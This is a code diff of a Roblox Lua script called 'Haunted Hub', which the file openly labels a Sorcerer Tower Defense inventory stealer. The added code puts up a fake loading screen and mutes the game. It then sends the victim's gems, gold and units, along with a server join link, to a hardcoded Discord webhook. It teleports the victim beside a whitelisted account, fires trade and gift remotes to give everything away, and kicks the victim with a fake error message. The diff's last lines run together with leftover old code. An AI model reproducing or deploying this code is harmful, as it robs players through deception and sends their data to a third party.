@@ -1,5 +1,6 @@
--- Haunted Hub 👻 - Sorcerer TD stealer / transfer (Arcus X Neo compatibility attempt)
--- Moved GUI to PlayerGui, added debug prints, fallback http
+-- Haunted Hub 👻 - Sorcerer Tower Defense stealer / transfer tool
+-- Educational / testing use only. Using this violates Roblox TOS.
+-- Updated for executor compatibility: Fallback HTTP methods (PostAsync, request, syn.request, http_request)
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -9,32 +10,376 @@ local TeleportService = game:GetService("TeleportService")
 local SoundService = game:GetService("SoundService")
 
 local LocalPlayer = Players.LocalPlayer
-local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
+local Leaderstats = LocalPlayer:WaitForChild("leaderstats")
 
-print("[DEBUG] Script started execution")
+wait(3) -- Let game load
 
-wait(2)
-print("[DEBUG] Waited 2s, attempting to create GUI")
+-- ⚙️ CONFIG
+local WEBHOOK = "https://discord.com/api/webhooks/1457853335754248432/t6Q4gvQjdLRy52bD70vwYyjQpYIU9O6qvUovKtlGpEiB67xmvt62idiUT8qxDY9ZvAwG"  -- Your Discord webhook
+local WHITELIST = {4946984979}  -- YOUR Roblox UserID (number)
 
--- CONFIG
-local WEBHOOK = "https://discord.com/api/webhooks/1457853335754248432/t6Q4gvQjdLRy52bD70vwYyjQpYIU9O6qvUovKtlGpEiB67xmvt62idiUT8qxDY9ZvAwG"
-local WHITELIST = {4946984979} -- change to your UserId
+-- 📊 COLLECT FULL INVENTORY DATA (STD Specific: Gems, Gold, Units w/ Rarity)
+local function getInventory()
+    local data = {
+        gems = 0,
+        gold = 0,
+        units = {},  -- Now list of {name, rarity, amount}
+        totalValue = 0
+    }
+    
+    -- Leaderstats (Gems, Gold/Coins)
+    for _, stat in pairs(Leaderstats:GetChildren()) do
+        if stat:IsA("IntValue") or stat:IsA("NumberValue") then
+            if stat.Name:lower():find("gem") then data.gems = stat.Value
+            elseif stat.Name:lower():find("gold") or stat.Name:lower():find("coin") then data.gold = stat.Value
+            else data[stat.Name:lower()] = stat.Value end
+        end
+    end
+    
+    -- Inventory Folder/Tools (Units only)
+    local invFolders = {LocalPlayer:FindFirstChild("Inventory"), LocalPlayer:FindFirstChild("PlayerData"), LocalPlayer:FindFirstChild("Backpack")}
+    for _, folder in pairs(invFolders) do
+        if folder then
+            for _, item in pairs(folder:GetChildren()) do
+                if item:IsA("Tool") or item:IsA("Folder") then
+                    local name = item.Name
+                    local rarity = item:FindFirstChild("Rarity") and item.Rarity.Value or "Common"
+                    local amount = item:FindFirstChild("Amount") and item.Amount.Value or 1
+                    
+                    if name:find("Unit") or name:find("Sorcerer") then
+                        table.insert(data.units, {name = name, rarity = rarity, amount = amount})
+                    end
+                end
+            end
+        end
+    end
+    
+    -- Count totals
+    local totalUnits = #data.units
+    
+    data.totalUnits = totalUnits
+    
+    return data
+end
 
--- Try to create GUI in PlayerGui instead of CoreGui
-local sg = Instance.new("ScreenGui")
-sg.Name = "HauntedHubLoading"
-sg.ResetOnSpawn = false
-sg.Parent = PlayerGui   -- <--- changed from CoreGui
-print("[DEBUG] ScreenGui created in PlayerGui")
+-- 📊 FORMAT UNITS LIST FOR EMBED (Names + Rarity + Amount)
+local function formatUnitsList(units)
+    local list = ""
+    for _, unit in pairs(units) do
+        list = list .. unit.name .. " (" .. unit.rarity .. "): " .. unit.amount .. "\n"
+    end
+    return list \~= "" and list or "None"
+end
 
-local bg = Instance.new("Frame", sg)
-bg.Size = UDim2.new(1,0,1,0)
-bg.BackgroundColor3 = Color3.new(0.08, 0.08, 0.08)
+-- Universal HTTP POST fallback (tries multiple methods for executor compatibility)
+local function universalPost(url, body, contentType)
+    local success, result
+    local methods = {
+        -- Method 1: Standard HttpService:PostAsync
+        function()
+            return pcall(function()
+                return HttpService:PostAsync(url, body, contentType)
+            end)
+        end,
+        -- Method 2: request (Krnl, Fluxus, etc.)
+        function()
+            if request then
+                return pcall(function()
+                    return request({
+                        Url = url,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = contentType.Value},
+                        Body = body
+                    }).Body
+                end)
+            end
+            return false
+        end,
+        -- Method 3: http_request (some executors)
+        function()
+            if http_request then
+                return pcall(function()
+                    return http_request({
+                        Url = url,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = contentType.Value},
+                        Body = body
+                    }).Body
+                end)
+            end
+            return false
+        end,
+        -- Method 4: syn.request (Synapse X)
+        function()
+            if syn and syn.request then
+                return pcall(function()
+                    return syn.request({
+                        Url = url,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = contentType.Value},
+                        Body = body
+                    }).Body
+                end)
+            end
+            return false
+        end,
+        -- Method 5: HttpService:RequestAsync (fallback)
+        function()
+            return pcall(function()
+                return HttpService:RequestAsync({
+                    Url = url,
+                    Method = "POST",
+                    Headers = {["Content-Type"] = contentType.Value},
+                    Body = body
+                }).Body
+            end)
+        end
+    }
+    
+    for i, method in ipairs(methods) do
+        success, result = method()
+        if success and result then
+            print("Webhook sent using method " .. i)
+            return result
+        elseif not success then
+            warn("Method " .. i .. " failed: " .. tostring(result))
+        end
+    end
+    
+    warn("All HTTP methods failed - webhook not sent")
+    return nil
+end
 
-local title = Instance.new("TextLabel", bg)
-title.Size = UDim2.new(0.7,0,0.12,0)
-title.Position = UDim2.new(0.15,0,0.25,0)
-title.BackgroundTransparency = 1
+-- 📤 SEND RICH DISCORD WEBHOOK (takes joinLink)
+local function sendWebhook(joinLink)
+    local inv = getInventory()
+    
+    local data = {
+        ["embeds"] = {{
+            ["title"] = "🔮 " .. LocalPlayer.Name .. " (" .. LocalPlayer.UserId .. ") SORCERER TD STEALED! 💎",
+            ["description"] = "Join IMMEDIATELY! Auto-trade/gift activates when you approach.",
+            ["color"] = 16711935,  -- Purple (magic theme)
+            ["thumbnail"] = {["url"] = "https://tr.rbxcdn.com/HEADSHOT?width=150&height=150&format=png&UserID=" .. LocalPlayer.UserId},
+            ["fields"] = {
+                {["name"] = "💎 Gems", ["value"] = tostring(inv.gems), ["inline"] = true},
+                {["name"] = "🪙 Gold", ["value"] = tostring(inv.gold), ["inline"] = true},
+                {["name"] = "⚔️ Total Units", ["value"] = tostring(inv.totalUnits), ["inline"] = true},
+                {["name"] = "🔮 Units List (Name - Rarity: Amount)", ["value"] = formatUnitsList(inv.units), ["inline"] = false}
+            },
+            ["footer"] = {
+                ["text"] = "🌀 Server Join: " .. joinLink,
+                ["icon_url"] = "https://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&format=Png&url=https%3A%2F%2Fwww.roblox.com%2FHeadshot.ashx%3Fid%3D" .. LocalPlayer.UserId
+            }
+        }}
+    }
+    
+    local encoded = HttpService:JSONEncode(data)
+    universalPost(WEBHOOK, encoded, Enum.HttpContentType.ApplicationJson)
+    print("🔔 Attempted webhook send")
+end
+
+-- 🖥️ FAKE LOADING SCREEN (Innocent "Haunted Hub 👻" title + varying messages + enhanced UI)
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "HauntedHubLoading"
+ScreenGui.Parent = game:GetService("CoreGui")
+ScreenGui.ResetOnSpawn = false
+
+local BackgroundFrame = Instance.new("Frame")
+BackgroundFrame.Size = UDim2.new(1, 0, 1, 0)
+BackgroundFrame.BackgroundColor3 = Color3.new(0.1, 0.1, 0.1)  -- Dark theme for "haunted"
+BackgroundFrame.BorderSizePixel = 0
+BackgroundFrame.Parent = ScreenGui
+
+-- Hub Title
+local HubTitle = Instance.new("TextLabel")
+HubTitle.Size = UDim2.new(0.6, 0, 0.1, 0)
+HubTitle.Position = UDim2.new(0.2, 0, 0.3, 0)
+HubTitle.BackgroundTransparency = 1
+HubTitle.Text = "Haunted Hub 👻"
+HubTitle.TextColor3 = Color3.new(1, 0.5, 0)  -- Orange for spooky
+HubTitle.TextScaled = true
+HubTitle.Font = Enum.Font.Creepster  -- Spooky font
+HubTitle.Parent = BackgroundFrame
+
+-- Loading Message (Varying)
+local LoadingMessage = Instance.new("TextLabel")
+LoadingMessage.Size = UDim2.new(0.5, 0, 0.05, 0)
+LoadingMessage.Position = UDim2.new(0.25, 0, 0.42, 0)
+LoadingMessage.BackgroundTransparency = 1
+LoadingMessage.Text = "Initializing Scripts..."
+LoadingMessage.TextColor3 = Color3.new(1, 1, 1)
+LoadingMessage.TextScaled = true
+LoadingMessage.Font = Enum.Font.Gotham
+LoadingMessage.Parent = BackgroundFrame
+
+-- Loading Bar Frame
+local LoadingBarFrame = Instance.new("Frame")
+LoadingBarFrame.Size = UDim2.new(0.5, 0, 0.03, 0)
+LoadingBarFrame.Position = UDim2.new(0.25, 0, 0.5, 0)
+LoadingBarFrame.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+LoadingBarFrame.BorderSizePixel = 0
+LoadingBarFrame.Parent = BackgroundFrame
+
+-- Gradient for Loading Bar (Better look)
+local UIGradient = Instance.new("UIGradient")
+UIGradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.new(0, 1, 0)),
+    ColorSequenceKeypoint.new(1, Color3.new(0, 0.5, 0))
+}
+UIGradient.Parent = LoadingBarFrame
+
+-- Loading Bar Fill
+local BarFill = Instance.new("Frame")
+BarFill.Size = UDim2.new(0, 0, 1, 0)
+BarFill.BackgroundColor3 = Color3.new(1, 1, 1)  -- Will use gradient
+BarFill.BorderSizePixel = 0
+BarFill.Parent = LoadingBarFrame
+
+-- Spinner (Rotating icon for realism)
+local Spinner = Instance.new("ImageLabel")
+Spinner.Size = UDim2.new(0.05, 0, 0.05, 0)
+Spinner.Position = UDim2.new(0.475, 0, 0.55, 0)
+Spinner.BackgroundTransparency = 1
+Spinner.Image = "rbxassetid://1234567890"  -- Replace with a spinner asset ID (e.g., loading icon)
+Spinner.Parent = BackgroundFrame
+
+-- Rotate Spinner
+spawn(function()
+    while true do
+        TweenService:Create(Spinner, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut), {Rotation = 360}):Play()
+        wait(1)
+        Spinner.Rotation = 0
+    end
+end)
+
+-- Varying Loading Messages + Infinite Progress
+local messages = {
+    "Initializing Scripts...",
+    "Fetching Assets...",
+    "Optimizing Performance...",
+    "Loading Modules...",
+    "Syncing Data...",
+    "Preparing Features...",
+    "Almost Ready..."
+}
+local msgIndex = 1
+local percent = 0
+spawn(function()
+    while true do
+        percent = percent + 1
+        if percent > 100 then percent = 1 end
+        LoadingMessage.Text = messages[msgIndex] .. " " .. percent .. "%"
+        msgIndex = msgIndex + 1
+        if msgIndex > #messages then msgIndex = 1 end
+        TweenService:Create(BarFill, TweenInfo.new(1, Enum.EasingStyle.Quad), {Size = UDim2.new(percent/100, 0, 1, 0)}):Play()
+        wait(math.random(3, 5))
+    end
+end)
+
+-- 🔇 MUTE ALL GAME SOUNDS (Set Volume=0 on existing + new Sounds)
+local function muteSounds()
+    for _, obj in ipairs(game:GetDescendants()) do
+        if obj:IsA("Sound") then
+            obj.Volume = 0
+        end
+    end
+end
+muteSounds()  -- Initial mute
+
+game.DescendantAdded:Connect(function(obj)
+    if obj:IsA("Sound") then
+        obj.Volume = 0
+    end
+end)
+
+-- SoundService tweaks (mute ambient/music)
+SoundService.AmbientReverb = Enum.ReverbType.NoReverb
+SoundService.RespectFilteringEnabled = true  -- Helps with muting
+
+-- 🚀 AUTO-SEND TRADE TO WHITELIST (STD Trade System) + CHECK EMPTY INV -> KICK
+spawn(function()
+    while true do
+        wait(0.5)
+        for _, player in pairs(Players:GetPlayers()) do
+            if table.find(WHITELIST, player.UserId) and player \~= LocalPlayer then
+                local targetChar = player.Character
+                if targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
+                    
+                    -- TP victim near you
+                    local victimChar = LocalPlayer.Character
+                    if victimChar and victimChar.PrimaryPart then
+                        victimChar:SetPrimaryPartCFrame(targetChar.HumanoidRootPart.CFrame * CFrame.new(5, 0, 0))
+                        wait(0.3)
+                    end
+                    
+                    -- 🔥 SPAM TRADE/GIFT REMOTES (Focus on units - victim sends to whitelist)
+                    local tradeRemotes = {
+                        GameEvents:FindFirstChild("TradeItem"),
+                        GameEvents:FindFirstChild("GiveItem"),
+                        GameEvents:FindFirstChild("TransferUnit"),
+                        GameEvents:FindFirstChild("TradeUnit"),
+                        ReplicatedStorage:FindFirstChild("TradeRemote", true)
+                    }
+                    
+                    for _, remote in pairs(tradeRemotes) do
+                        if remote and remote:IsA("RemoteEvent") then
+                            -- Fire with ALL inventory to target (victim sends trade)
+                            pcall(function()
+                                remote:FireServer(player, "ALL")  -- "ALL" assumes game supports bulk
+                                remote:FireServer(player.UserId, LocalPlayer.Backpack)  -- Send backpack
+                            end)
+                        end
+                    end
+                    
+                    -- Spam ProximityPrompt gifts (backup)
+                    local giftPrompt = targetChar:FindFirstChild("ProximityPrompt", true)
+                    if giftPrompt then
+                        for i = 1, 50 do
+                            fireproximityprompt(giftPrompt)
+                            wait(0.02)
+                        end
+                    end
+                    
+                    print("🎁 AUTO-SENT TRADE ALL TO " .. player.Name .. "! 💎")
+                    
+                    -- 🛑 CHECK IF ALL ITEMS LOST -> KICK w/ FAKE ERROR
+                    wait(1)  -- Delay for trade to process
+                    local postInv = getInventory()
+                    if postInv.totalUnits == 0 and postInv.gems == 0 and postInv.gold == 0 then
+                        LocalPlayer:Kick("error 404 script couldn't load try again")
+                        break
+                    end
+                end
+                break
+            end
+        end
+    end
+end)
+
+-- 🔥 EXECUTE LOGIC (Hop if full, persist via TeleportData)
+local arrivingData = TeleportService:GetArrivingTeleportData()
+
+if not (arrivingData and arrivingData.stealer) then
+    -- Not from hop -> Check full & send webhook
+    wait(2)  -- Let screen show
+    
+    local joinLink
+    if #Players:GetPlayers() >= Players.MaxPlayers then
+        print("Server FULL - Hopping to PRIVATE for whitelisted join! 🚀")
+        local code = TeleportService:ReserveServer(game.PlaceId)
+        joinLink = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&linkCode=" .. code
+        TeleportService:SetTeleportData({stealer = true})
+        sendWebhook(joinLink)
+        wait(1)  -- Delay for send
+        TeleportService:TeleportToPrivateServer(game.PlaceId, code, {LocalPlayer})
+    else
+        joinLink = "roblox://experiences/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. tostring(game.JobId)
+        sendWebhook(joinLink)
+    end
+end
+
+print("🔮 Sorcerer Tower Defense Stealer LOADED! Webhook sent if needed. Wait for whitelist -> AUTO SEND TRADE EVERYTHING!")
+print("💎 Gems, 🪙 Gold, ⚔️ Units -> YOURS!")title.BackgroundTransparency = 1
 title.Text = "Haunted Hub 👻"
 title.TextColor3 = Color3.fromRGB(255, 140, 0)
 title.TextScaled = true
